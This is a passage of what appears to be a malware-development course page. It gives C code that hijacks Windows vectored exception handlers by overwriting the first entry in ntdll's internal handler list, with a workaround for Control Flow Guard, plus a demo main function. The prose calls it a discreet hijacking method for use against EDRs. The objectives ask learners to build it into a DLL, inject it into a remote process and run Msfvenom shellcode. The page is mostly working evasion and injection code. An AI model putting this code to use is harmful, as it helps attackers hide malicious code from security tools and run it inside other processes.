	HMODULE					hNtdll <span class="token operator">=</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"NTDLL.DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVectoredHandlerList</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pLdrpVectorHandlerList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed to Get LdrpVectorHandlerList \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _END_OF_FUNC<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Lock the VEH list to handle data races</span>
	<span class="token function">AcquireSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	bLocked <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH <span class="token operator">==</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pLdrpVectorHandlerList <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>VECTORED_HANDLER_LIST<span class="token punctuation">,</span> FirstVEH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] List is Empty, Nothing to Overwrite \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">goto</span> _END_OF_FUNC<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Check if CFG is enabled</span>
	bCfg <span class="token operator">=</span> <span class="token function">CheckCFGStatus</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// If CFG is enabled, mark the memory as RW</span>
	<span class="token comment">// This is to make sure this function works when a handler was registered the normal way</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pRtlProtectHeap <span class="token operator">=</span> <span class="token punctuation">(</span>fnRtlProtectHeap<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlProtectHeap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">goto</span> _END_OF_FUNC<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Entry is in the first page of "LdrpMrdataHeap"</span>
		pHeap <span class="token operator">=</span> <span class="token function">PAGE_ALIGN_DOWN</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>pHeap<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Overwrite the encoded pointer, aka the pointer to the actual registered handler</span>
	<span class="token comment">// This enables to handle every exception ourselves since this makes us the first top-level handler</span>
	<span class="token operator">*</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>FirstVEH<span class="token operator">-&gt;</span>VectoredHandler <span class="token operator">=</span> <span class="token function">EncodePointer</span><span class="token punctuation">(</span>pHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>

	bSuccess <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully Overwrote First VEH \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


_END_OF_FUNC<span class="token operator">:</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bLocked<span class="token punctuation">)</span>
		<span class="token function">ReleaseSRWLockExclusive</span><span class="token punctuation">(</span>pLdrpVectorHandlerList<span class="token operator">-&gt;</span>LockVEH<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>bCfg<span class="token punctuation">)</span>
		<span class="token function">RtlProtectHeapWrapper</span><span class="token punctuation">(</span>pHeap<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> pRtlProtectHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>
		
	<span class="token keyword">return</span> bSuccess<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<img src="69_files/overwrite-first-veh.png" style="margin:auto" width="1200px">
<p>Only the protection settings for <code>LdrpMrdataHeap</code> must be 
adjusted when CFG is enabled, providing a discreet method to hijack an 
already registered vectored handler. For stability, it is crucial to 
understand the original handler's intended purpose. In scenarios 
involving EDRs, if we alter an entry whose handler was designed to 
manage page guards or hardware breakpoints, we must incorporate 
additional logic into our new handler to appropriately process those 
exceptions.</p>
<h3 id="toc-heading-32">Main Function</h3>
<p>The main function in this implementation adds, removes, and 
overwrites vectored handlers with both WinAPIs and custom functions 
introduced in this module.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] My PID: %ld\n"</span><span class="token punctuation">,</span> <span class="token function">GetProcessId</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	PVOID	pVeh1 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			pVeh2 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			pVch1 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Manually Add a VEH&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// LdrpVectorHandlerList.FirstVEH -&gt; NewHandler1</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pVeh1 <span class="token operator">=</span> <span class="token function">AddVectoredExceptionHandlerReplacement</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>NewHandler1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error Manually Adding VEH \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Cause an Exception&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">CauseException</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Add a VEH the Normal Way&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// LdrpVectorHandlerList.FirstVEH -&gt; NewHandler2 -&gt; NewHandler1</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pVeh2 <span class="token operator">=</span> <span class="token function">AddVectoredExceptionHandler</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>NewHandler2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"AddVectoredExceptionHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Entry Successfully Added @ 0x%p \n"</span><span class="token punctuation">,</span> pVeh2<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Cause an Exception&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">CauseException</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Overwrite First VEH&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// LdrpVectorHandlerList.FirstVEH -&gt; NewHandler3 -&gt; NewHandler1</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">OverWriteFirstVectoredExceptionHandler</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>NewHandler3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Overwriting First VEH Failed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Cause an Exception&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">CauseException</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Add a VCH&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// LdrpVectorHandlerList.FirstVEH -&gt; NewHandler3 -&gt; NewHandler1</span>
	<span class="token comment">// LdrpVectorHandlerList.FirstVCH -&gt; NewHandler4</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pVch1 <span class="token operator">=</span> <span class="token function">AddVectoredContinueHandlerReplacement</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>NewHandler4<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error Manually Adding VCH \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Cause an Exception&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">CauseException</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Remove All Vectored Handlers&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">RemoveVectoredExceptionHandlerReplacement</span><span class="token punctuation">(</span>pVeh1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error removing handler @ 0x%p\n"</span><span class="token punctuation">,</span> pVeh1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">RemoveVectoredExceptionHandlerReplacement</span><span class="token punctuation">(</span>pVeh2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error removing handler @ 0x%p\n"</span><span class="token punctuation">,</span> pVeh2<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">RemoveVectoredContinueHandlerReplacement</span><span class="token punctuation">(</span>pVch1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error removing handler @ 0x%p\n"</span><span class="token punctuation">,</span> pVch1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;Enter to Quit&gt;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-33">Resources</h3>
<ul>
<li>
<p><a href="https://bruteratel.com/research/2024/10/20/Exception-Junction/" target="_blank">Exception Junction - Where All Exceptions Meet Their Handler</a></p>
</li>
<li>
<p><a href="https://securityintelligence.com/x-force/using-veh-for-defense-evasion-process-injection/" target="_blank">You just got vectored  Using Vectored Exception Handlers (VEH) for defense evasion and process injection</a></p>
</li>
<li>
<p><a href="https://mannyfreddy.gitbook.io/ya-boy-manny" target="_blank">Fun with Exception Handlers</a></p>
</li>
<li>
<p><a href="https://www.nccgroup.com/us/research-blog/detecting-anomalous-vectored-exception-handlers-on-windows/" target="_blank">Detecting anomalous Vectored Exception Handlers on Windows</a></p>
</li>
<li>
<p><a href="https://dimitrifourny.github.io/2020/06/11/dumping-veh-win10.html" target="_blank">Dumping the VEH in Windows 10</a></p>
</li>
</ul>

    </div>

    
        
</div></div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Experiment
 with the AddVectoredExceptionHandlerReplacement and 
OverwriteFirstVectoredExceptionHandler functions to add and then 
overwrite a VEH exception handler</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Experiment with the AddVectoredContinueHandlerReplacement function to add a new continue vectored handler</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Convert
 this implementation into a DLL, then inject it into a remote process, 
overwriting the target process's VEH exception handler, executing a 
Msfvenom-generated shellcode</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:40px" data-target-id="toc-heading-0">
        <span class="text-gray-300 hover:text-white text-sm">Introduction to Vectored Handler Manipulation</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-1">
        <span class="text-gray-300 hover:text-white text-sm">Introduction</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-2">
        <span class="text-gray-300 hover:text-white text-sm">The Control Flow Guard (CFG)</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-3">
        <span class="text-gray-300 hover:text-white text-sm">The Types of Vectored Handlers</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-4">
        <span class="text-gray-300 hover:text-white text-sm">The Vectored Handler List</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-5">
        <span class="text-gray-300 hover:text-white text-sm">Vectored Handler Entries</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-6">
        <span class="text-gray-300 hover:text-white text-sm">Implementing Code Injection Logic</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-7">
        <span class="text-gray-300 hover:text-white text-sm">Process Cookies</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-8">
        <span class="text-gray-300 hover:text-white text-sm">Obtaining a Process's Cookie</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-9">
        <span class="text-gray-300 hover:text-white text-sm">The GetVectoredHandlerList Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-10">
        <span class="text-gray-300 hover:text-white text-sm">The GetLdrProtectMrdata Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-11">
        <span class="text-gray-300 hover:text-white text-sm">The GetLdrpMrdataHeap Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-12">
        <span class="text-gray-300 hover:text-white text-sm">The GetLdrEnsureMrdataHeapExists Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-13">
        <span class="text-gray-300 hover:text-white text-sm">The FlipBit Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-14">
        <span class="text-gray-300 hover:text-white text-sm">Handling Control Flow Guard (CFG)</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-15">
        <span class="text-gray-300 hover:text-white text-sm">The CheckCFGStatus Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-16">
        <span class="text-gray-300 hover:text-white text-sm">The LdrProtectMrdataWrapper Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-17">
        <span class="text-gray-300 hover:text-white text-sm">The RtlProtectHeapWrapper Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-18">
        <span class="text-gray-300 hover:text-white text-sm">The LdrEnsureMrdataHeapExistsWrapper Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-19">
        <span class="text-gray-300 hover:text-white text-sm">The AddVectoredExceptionHandlerReplacement And AddVectoredContinueHandlerReplacement Functions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-20">
        <span class="text-gray-300 hover:text-white text-sm">Resolving The Location Of Internal Functions And Variables</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-21">
        <span class="text-gray-300 hover:text-white text-sm">Checking If CFG Is Enabled</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-22">
        <span class="text-gray-300 hover:text-white text-sm">Determining If the List Is Empty</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-23">
        <span class="text-gray-300 hover:text-white text-sm">Allocating a Vectored Handler Entry</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-24">
        <span class="text-gray-300 hover:text-white text-sm">Inserting The New Handler Into LdrpVectorHandlerList</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-25">
        <span class="text-gray-300 hover:text-white text-sm">Finishing Up</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-26">
        <span class="text-gray-300 hover:text-white text-sm">Full AddVectoredExceptionHandlerReplacement Code</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-27">
        <span class="text-gray-300 hover:text-white text-sm">Complete AddVectoredContinueHandlerReplacement Code</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-28">
        <span class="text-gray-300 hover:text-white text-sm">RemoveVectoredExceptionHandlerReplacement And RemoveVectoredContinueHandlerReplacement Functions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-29">
        <span class="text-gray-300 hover:text-white text-sm">Full RemoveVectoredExceptionHandlerReplacement Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-30">
        <span class="text-gray-300 hover:text-white text-sm">Full RemoveVectoredContinueHandlerReplacement Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-31">
        <span class="text-gray-300 hover:text-white text-sm">Handler Overwriting</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-32">
        <span class="text-gray-300 hover:text-white text-sm">Main Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-33">
        <span class="text-gray-300 hover:text-white text-sm">Resources</span>
      </div></div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="69_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill="">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
